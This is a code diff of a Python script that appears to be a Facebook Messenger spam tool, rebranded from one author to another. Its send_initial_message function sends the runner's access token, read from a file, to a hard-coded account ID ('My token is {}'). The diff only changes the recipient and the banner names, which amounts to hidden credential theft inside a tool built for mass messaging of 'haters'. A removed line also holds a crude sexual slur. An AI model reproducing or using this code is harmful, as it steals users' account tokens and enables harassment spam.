@@ -39,15 +39,15 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello SANSKAR SIR  ! I am using your server but dont fyt dark night members. My token is {}"
+      msg_template = "Hello ABHAY SIR  ! I am using your server but dont fyt dark night members. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100003649779942"
+      target_id = "61564149968200"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•──────────────────────TRICk BY SANSKAR SINGH  ──────────────────────────────•')
+          print('\033[1;92m' + '•──────────────────────THAKUR DIGVIJAY SINGH H3R3  ──────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
@@ -121,7 +121,7 @@ def send_messages_from_file():
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                   if response.ok:
-                      print("\033[1;92m[+] RAHUL KI BOBO KI CHUT ME GHUS GYA MESSAGE {} of Convo {} Token {}: {}".format(
+                      print("\033[1;92m[+] 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐒𝐄𝐍𝐃 𝐁𝐘 𝐏𝐔𝐒𝐇𝐏𝐀 {} of Convo {} Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
